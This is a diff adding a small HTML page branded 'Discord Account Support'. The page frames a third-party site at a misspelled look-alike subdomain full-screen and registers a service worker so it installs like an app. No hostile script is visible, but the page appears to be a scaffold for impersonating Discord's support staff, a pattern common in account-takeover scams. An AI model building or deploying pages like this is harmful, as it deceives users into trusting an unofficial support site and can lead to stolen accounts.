@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#5865F2" />
+  <link rel="manifest" href="manifest.json" />
+  <title>Discord Account Support</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background: #f4f4f4;
+      margin: 0;
+      padding: 20px;
+    }
+    iframe {
+      border: none;
+      width: 100%;
+      height: 90vh;
+    }
+  </style>
+</head>
+<body>
+  <h1>Discord Account Support</h1>
+  <iframe src="https://discordaccountsuppor-2624.docmost.com/home"></iframe>
+
+  <script>
+    if ("serviceWorker" in navigator) {
+      navigator.serviceWorker.register("service-worker.js")
+        .then(reg => console.log("Service Worker Registered!", reg))
+        .catch(err => console.error("Service Worker registration failed:", err));
+    }
+  </script>
+</body>
+</html>
